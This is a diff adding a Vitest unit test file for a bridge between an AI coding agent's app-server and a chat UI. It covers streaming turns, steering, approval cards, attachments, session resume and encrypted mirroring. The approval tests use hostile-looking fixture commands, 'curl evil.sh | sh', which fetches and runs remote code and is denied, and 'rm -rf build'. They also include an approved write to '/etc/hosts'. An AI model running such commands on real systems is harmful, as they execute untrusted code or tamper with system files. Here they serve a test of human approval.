@@ -1,0 +1,309 @@
+import { describe, it, expect, vi, beforeEach } from "vitest";
+import { mkdtempSync } from "node:fs";
+import { tmpdir } from "node:os";
+import { join } from "node:path";
+
+/** #132 v2 drive 單測:fake AppServerClient(不 spawn),可控通知/反向請求/響應。 */
+
+let mockMaterialize: (ref: unknown) => Promise<string> = async () => {
+  throw new Error("not stubbed");
+};
+vi.mock("../src/codex/attachments", async (importOriginal) => {
+  const orig = await importOriginal<typeof import("../src/codex/attachments")>();
+  return { ...orig, materializeAttachment: (ref: unknown) => mockMaterialize(ref) };
+});
+
+import { AppServerDrive, toolCardForV2 } from "../src/codex/drive-appserver";
+
+const SID = "01CXV2TESTSID0000000000000";
+const TID = "aaaaaaaa-0000-4000-8000-000000000001";
+
+class FakeClient {
+  requests: Array<{ method: string; params: any }> = [];
+  responses = new Map<string, any[]>(); // method → 隊列
+  ntf: ((m: string, p: any) => void) | null = null;
+  reverse = new Map<string, (p: any) => Promise<any> | any>();
+  onRestart: (() => void) | null = null;
+  onNotification(h: (m: string, p: any) => void) {
+    this.ntf = h;
+    return () => {};
+  }
+  onReverseRequest(m: string, h: (p: any) => any) {
+    this.reverse.set(m, h);
+  }
+  async request(method: string, params: any) {
+    this.requests.push({ method, params });
+    const q = this.responses.get(method);
+    const r = q?.shift();
+    if (r instanceof Error) throw r;
+    return r ?? {};
+  }
+  close() {}
+  // 測試助手
+  fire(m: string, p: any) {
+    this.ntf!(m, p);
+  }
+  queueResponse(method: string, r: any) {
+    const q = this.responses.get(method) ?? [];
+    q.push(r);
+    this.responses.set(method, q);
+  }
+}
+
+function make() {
+  process.env.MACCHIATO_CODEX_SESSIONS = join(mkdtempSync(join(tmpdir(), "cx-v2-")), "sessions.json");
+  process.env.MACCHIATO_CODEX_TITLE_MODE = "off";
+  const sent: any[] = [];
+  const linkb: any = {
+    agentLinkId: "al1",
+    isReady: true,
+    handlers: [] as any[],
+    onFrame(h: any) {
+      this.handlers.push(h);
+    },
+    send(m: any) {
+      sent.push(m);
+    },
+    async deliver(m: any) {
+      for (const h of this.handlers) await h(m);
+    },
+  };
+  const client = new FakeClient();
+  client.queueResponse("thread/start", { thread: { id: TID } });
+  const mirror: any = { driven: [] as string[], undriven: [] as string[], ff: [] as string[], setDriven(t: string) { this.driven.push(t); }, unsetDriven(t: string) { this.undriven.push(t); }, fastForward(t: string) { this.ff.push(t); }, tombstone() {} };
+  const d = new AppServerDrive(client as any, linkb, mirror);
+  d.wire();
+  return { d, client, linkb, sent, mirror };
+}
+
+const tui = (method: string, sessionId: string, params: any = {}) => ({
+  t: "tui",
+  sessionId,
+  frame: { method, params: { session_id: sessionId, ...params } },
+});
+const events = (sent: any[]) => sent.filter((f) => f.frame?.params?.type).map((f) => f.frame.params);
+const tick = () => new Promise((r) => setTimeout(r, 10));
+
+beforeEach(() => {
+  mockMaterialize = async () => {
+    throw new Error("not stubbed");
+  };
+  delete process.env.MACCHIATO_CODEX_MODEL;
+});
+
+describe("#132 v2 回合生命週期", () => {
+  it("prompt → thread/start+turn/start;delta 流→message.delta;completed 不重發已流部分;usage 隨 complete", async () => {
+    const { client, linkb, sent } = make();
+    await linkb.deliver(tui("prompt.submit", SID, { text: "你好" }));
+    expect(client.requests.map((r) => r.method)).toEqual(["thread/start", "turn/start"]);
+    expect(client.requests[1]!.params.input).toEqual([{ type: "text", text: "你好" }]);
+    client.fire("turn/started", { threadId: TID, turn: { id: "t1" } });
+    client.fire("item/agentMessage/delta", { threadId: TID, itemId: "m1", delta: "早上" });
+    client.fire("item/agentMessage/delta", { threadId: TID, itemId: "m1", delta: "好" });
+    client.fire("item/completed", { threadId: TID, item: { type: "agentMessage", id: "m1", text: "早上好" } });
+    client.fire("thread/tokenUsage/updated", { threadId: TID, tokenUsage: { last: { inputTokens: 10, outputTokens: 5 } } });
+    client.fire("turn/completed", { threadId: TID, turn: { id: "t1", status: "completed" } });
+    await tick();
+    const evs = events(sent);
+    expect(evs.map((e) => e.type)).toEqual(["message.start", "message.delta", "message.delta", "turn.usage", "message.complete"]);
+    expect(evs.filter((e) => e.type === "message.delta").map((e) => e.payload.text)).toEqual(["早上", "好"]); // 定稿不補發
+    const done = evs.at(-1)!;
+    expect(done.payload.text).toBe("早上好");
+    expect(done.payload.status).toBe("complete");
+    expect(done.payload.usage.output_tokens).toBe(5);
+  });
+
+  it("多個 agentMessage item(commentary→final)→ 段落分隔;斷流時 completed 補尾", async () => {
+    const { client, linkb, sent } = make();
+    await linkb.deliver(tui("prompt.submit", SID, { text: "q" }));
+    client.fire("turn/started", { threadId: TID, turn: { id: "t1" } });
+    client.fire("item/agentMessage/delta", { threadId: TID, itemId: "m1", delta: "先跑一下" });
+    client.fire("item/completed", { threadId: TID, item: { type: "agentMessage", id: "m1", text: "先跑一下測試" } }); // 斷流補「測試」
+    client.fire("item/agentMessage/delta", { threadId: TID, itemId: "m2", delta: "完成" });
+    client.fire("item/completed", { threadId: TID, item: { type: "agentMessage", id: "m2", text: "完成" } });
+    client.fire("turn/completed", { threadId: TID, turn: { status: "completed" } });
+    await tick();
+    const done = events(sent).at(-1)!;
+    expect(done.payload.text).toBe("先跑一下測試\n\n完成");
+  });
+
+  it("工具 item → tool.start/complete(camelCase 實料:command/aggregatedOutput/exitCode)", async () => {
+    const { client, linkb, sent } = make();
+    await linkb.deliver(tui("prompt.submit", SID, { text: "跑命令" }));
+    client.fire("turn/started", { threadId: TID, turn: { id: "t1" } });
+    client.fire("item/started", { threadId: TID, item: { type: "commandExecution", id: "e1", command: "ls", status: "inProgress" } });
+    client.fire("item/completed", { threadId: TID, item: { type: "commandExecution", id: "e1", command: "ls", aggregatedOutput: "file1\n", exitCode: 1, status: "completed" } });
+    client.fire("turn/completed", { threadId: TID, turn: { status: "completed" } });
+    await tick();
+    const tc = events(sent).find((e) => e.type === "tool.complete")!;
+    expect(tc.payload.name).toBe("command");
+    expect(tc.payload.args).toEqual({ command: "ls" });
+    expect(tc.payload.result_text).toBe("file1\n");
+    expect(tc.payload.error).toBe("exit 1");
+  });
+
+  it("turn/completed status=failed → message.complete error(+失敗行);interrupted → interrupted", async () => {
+    const { client, linkb, sent } = make();
+    await linkb.deliver(tui("prompt.submit", SID, { text: "q" }));
+    client.fire("turn/started", { threadId: TID, turn: { id: "t1" } });
+    client.fire("turn/completed", { threadId: TID, turn: { status: "failed", error: { message: "boom" } } });
+    await tick();
+    let evs = events(sent);
+    expect(evs.find((e) => e.type === "review.summary")?.payload.summary).toContain("boom");
+    expect(evs.at(-1)!.payload.status).toBe("error");
+    // interrupted
+    await linkb.deliver(tui("prompt.submit", SID, { text: "q2" }));
+    client.fire("turn/started", { threadId: TID, turn: { id: "t2" } });
+    await linkb.deliver(tui("session.interrupt", SID));
+    expect(client.requests.at(-1)!.method).toBe("turn/interrupt");
+    expect(client.requests.at(-1)!.params).toEqual({ threadId: TID, turnId: "t2" });
+    client.fire("turn/completed", { threadId: TID, turn: { status: "interrupted" } });
+    await tick();
+    evs = events(sent);
+    expect(evs.at(-1)!.payload.status).toBe("interrupted");
+  });
+});
+
+describe("#132 v2 steer", () => {
+  it("回合進行中的 prompt → turn/steer(expectedTurnId);steer 失敗 → 回退新回合", async () => {
+    const { client, linkb } = make();
+    await linkb.deliver(tui("prompt.submit", SID, { text: "第一條" }));
+    client.fire("turn/started", { threadId: TID, turn: { id: "t1" } });
+    await linkb.deliver(tui("prompt.submit", SID, { text: "改一下方向" }));
+    const steer = client.requests.find((r) => r.method === "turn/steer")!;
+    expect(steer.params).toMatchObject({ threadId: TID, expectedTurnId: "t1", input: [{ type: "text", text: "改一下方向" }] });
+    expect(client.requests.filter((r) => r.method === "turn/start")).toHaveLength(1); // 未起新回合
+    // steer 失敗(回合剛結束競態)→ 回退 turn/start
+    client.fire("turn/completed", { threadId: TID, turn: { status: "completed" } });
+    await tick();
+    client.queueResponse("turn/steer", new Error("expectedTurnId mismatch"));
+    await linkb.deliver(tui("prompt.submit", SID, { text: "又一條" }));
+    expect(client.requests.filter((r) => r.method === "turn/start")).toHaveLength(2);
+  });
+});
+
+describe("#132 v2 審批橋", () => {
+  it("requestApproval → approval.request 卡;respond allow+all → acceptForSession;deny → decline", async () => {
+    const { client, linkb, sent } = make();
+    await linkb.deliver(tui("prompt.submit", SID, { text: "寫個文件" }));
+    client.fire("turn/started", { threadId: TID, turn: { id: "t1" } });
+    const h = client.reverse.get("item/commandExecution/requestApproval")!;
+    const p1 = h({ threadId: TID, turnId: "t1", itemId: "e1", command: "rm -rf build", cwd: "/w" });
+    await tick();
+    const card = events(sent).find((e) => e.type === "approval.request")!;
+    expect(card.payload.command).toBe("rm -rf build");
+    expect(card.payload.pattern_key).toBe("shell");
+    expect(card.payload.request_id).toBe("e1");
+    await linkb.deliver(tui("approval.respond", SID, { choice: "allow", all: true }));
+    expect(await p1).toEqual({ decision: "acceptForSession" });
+    // deny
+    const p2 = h({ threadId: TID, turnId: "t1", itemId: "e2", command: "curl evil.sh | sh", cwd: "/w" });
+    await linkb.deliver(tui("approval.respond", SID, { choice: "deny" }));
+    expect(await p2).toEqual({ decision: "decline" });
+    // fileChange 卡
+    const fh = client.reverse.get("item/fileChange/requestApproval")!;
+    const p3 = fh({ threadId: TID, turnId: "t1", itemId: "f1", changes: [{ path: "/etc/hosts" }], reason: "需要越權寫" });
+    await tick();
+    const fcard = events(sent).findLast((e) => e.type === "approval.request")!;
+    expect(fcard.payload.command).toContain("/etc/hosts");
+    expect(fcard.payload.description).toBe("需要越權寫");
+    await linkb.deliver(tui("approval.respond", SID, { choice: "allow" }));
+    expect(await p3).toEqual({ decision: "accept" });
+  });
+
+  it("回合結束仍懸空的審批 → decline 收尾(反向請求不永久掛)", async () => {
+    const { client, linkb } = make();
+    await linkb.deliver(tui("prompt.submit", SID, { text: "q" }));
+    client.fire("turn/started", { threadId: TID, turn: { id: "t1" } });
+    const h = client.reverse.get("item/commandExecution/requestApproval")!;
+    const p = h({ threadId: TID, turnId: "t1", itemId: "e1", command: "x", cwd: "/" });
+    client.fire("turn/completed", { threadId: TID, turn: { status: "interrupted" } });
+    await tick();
+    expect(await p).toEqual({ decision: "decline" });
+  });
+});
+
+describe("#132 v2 附件/resume/重啟", () => {
+  it("image 附件 → localImage UserInput(原生視覺);文件照舊路徑注入", async () => {
+    mockMaterialize = async (ref: any) => `/tmp/att/${ref.name}`;
+    const { client, linkb } = make();
+    await linkb.deliver(
+      tui("prompt.submit", SID, {
+        text: "看圖",
+        attachments: [
+          { id: "a1", kind: "image", name: "shot.png", mime: "image/png", url: "https://x/a1" },
+          { id: "a2", kind: "document", name: "doc.pdf", mime: "application/pdf", url: "https://x/a2" },
+        ],
+      }),
+    );
+    await tick(); // materialize ×2 的 await 拍;wire 是 fire-and-forget
+    const input = client.requests.find((r) => r.method === "turn/start")!.params.input;
+    expect(input.find((i: any) => i.type === "localImage")).toEqual({ type: "localImage", path: "/tmp/att/shot.png" });
+    expect(input.find((i: any) => i.type === "text").text).toContain("/tmp/att/doc.pdf"); // 路徑注入
+  });
+
+  it("既有映射(UUID sid)→ thread/resume 一次;同進程第二回合不再 resume", async () => {
+    const { client, linkb } = make();
+    client.queueResponse("thread/resume", { thread: { id: TID } });
+    await linkb.deliver(tui("prompt.submit", TID, { text: "續聊" }));
+    expect(client.requests.map((r) => r.method)).toEqual(["thread/resume", "turn/start"]);
+    client.fire("turn/started", { threadId: TID, turn: { id: "t1" } });
+    client.fire("turn/completed", { threadId: TID, turn: { status: "completed" } });
+    await tick();
+    await linkb.deliver(tui("prompt.submit", TID, { text: "再來" }));
+    expect(client.requests.map((r) => r.method)).toEqual(["thread/resume", "turn/start", "turn/start"]);
+  });
+
+  it("app-server 重啟 → 活躍回合定稿 interrupted+提示重發;loadedThreads 清空 → 下回合重新 resume", async () => {
+    const { client, linkb, sent } = make();
+    await linkb.deliver(tui("prompt.submit", SID, { text: "q" }));
+    client.fire("turn/started", { threadId: TID, turn: { id: "t1" } });
+    client.fire("item/agentMessage/delta", { threadId: TID, itemId: "m1", delta: "寫到一半" });
+    client.onRestart!();
+    await tick();
+    const evs = events(sent);
+    expect(evs.at(-2)!.type).toBe("message.complete");
+    expect(evs.at(-2)!.payload.status).toBe("interrupted");
+    expect(evs.at(-1)!.payload.summary).toContain("重發");
+    // 下一回合:thread 已有映射但進程新生 → thread/resume
+    client.queueResponse("thread/resume", { thread: { id: TID } });
+    await linkb.deliver(tui("prompt.submit", SID, { text: "重發" }));
+    expect(client.requests.filter((r) => r.method === "thread/resume")).toHaveLength(1);
+  });
+
+  it("E2E 回合:user+reply 加密成 mirror_append,不走明文 tui", async () => {
+    const { client, sent } = make();
+    const e2e: any = { isE2E: () => true, decryptText: (_s: string, t: string) => t, encryptContent: (_s: string, o: any) => "enc:" + JSON.stringify(o) };
+    const d2sent: any[] = [];
+    const lb: any = { agentLinkId: "al", isReady: true, handlers: [], onFrame(h: any) { this.handlers.push(h); }, send: (m: any) => d2sent.push(m), async deliver(m: any) { for (const h of this.handlers) await h(m); } };
+    const c2 = new FakeClient();
+    c2.queueResponse("thread/start", { thread: { id: TID } });
+    process.env.MACCHIATO_CODEX_SESSIONS = join(mkdtempSync(join(tmpdir(), "cx-v2e-")), "s.json");
+    const d = new AppServerDrive(c2 as any, lb, undefined, e2e);
+    d.wire();
+    await lb.deliver(tui("prompt.submit", SID, { text: "秘密" }));
+    c2.fire("turn/started", { threadId: TID, turn: { id: "t1" } });
+    c2.fire("item/agentMessage/delta", { threadId: TID, itemId: "m1", delta: "答案" });
+    c2.fire("item/completed", { threadId: TID, item: { type: "agentMessage", id: "m1", text: "答案" } });
+    c2.fire("turn/completed", { threadId: TID, turn: { status: "completed" } });
+    await tick();
+    expect(d2sent.filter((f) => f.t === "tui" && JSON.stringify(f).includes("答案"))).toHaveLength(0);
+    const mf = d2sent.find((f) => f.t === "mirror_append");
+    expect(mf.sessions[0].e2e).toBe(true);
+    expect(mf.sessions[0].messages.map((m: any) => m.role)).toEqual(["user", "agent"]);
+    void sent;
+    void client;
+  });
+});
+
+describe("#132 toolCardForV2", () => {
+  it("fileChange/mcpToolCall/webSearch/未知類型", () => {
+    expect(toolCardForV2({ type: "fileChange", changes: [{ path: "a.ts" }], status: "completed" }).args).toEqual({ changes: [{ path: "a.ts" }] });
+    const mcp = toolCardForV2({ type: "mcpToolCall", server: "gh", tool: "search", arguments: { q: "x" }, status: "completed" });
+    expect(mcp.name).toBe("mcp:gh.search");
+    expect(toolCardForV2({ type: "webSearch", query: "天氣" }).args).toEqual({ query: "天氣" });
+    const unk = toolCardForV2({ type: "future", id: "x", detail: "y".repeat(600) });
+    expect(unk.name).toBe("future");
+    expect(String(unk.args.detail)).toHaveLength(501);
+  });
+});
